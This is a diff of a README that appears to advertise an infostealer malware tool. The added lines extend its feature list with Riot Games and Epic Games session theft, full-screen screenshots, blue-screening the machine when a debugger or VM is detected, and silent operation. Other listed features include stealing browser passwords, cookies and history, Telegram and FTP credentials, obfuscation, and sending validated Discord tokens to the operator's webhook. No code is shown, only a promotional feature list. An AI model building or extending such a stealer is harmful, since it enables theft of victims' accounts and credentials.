@@ -89,10 +89,12 @@
 > Browser (Chrome, Opera, Firefox, OperaGX, Edge, Brave, Yandex) -
 > Passwords, Cookies, Autofill & History (Searches for specific keywords such as PayPal, Coinbase etc. in them)
 >
-> Screenshot(s)
+> Screenshots all screen
 >
 > Telegram Session stealer
 >
+> Riot Games Session stealer
+> 
 > FTP stealer (FileZilla)
 >
 > Minecraft Session stealer & validator
@@ -109,6 +111,9 @@
 >
 > Reddit Session stealer & validator
 >
+> Epic Games Launcher Session stealer
+
+
 
 #### Additional
 
@@ -116,9 +121,9 @@
 >
 > Ultra Obfuscation (use https://obfuscator.io)
 >
-> Anti-Debug / Anti-VM
+> Anti-Debug / Anti-VM / Blue Screen if detect
 >
-> No Traces
+> No Traces and silent
 >
 > Validates a found discord token and then sends it to your discord webhook
 >
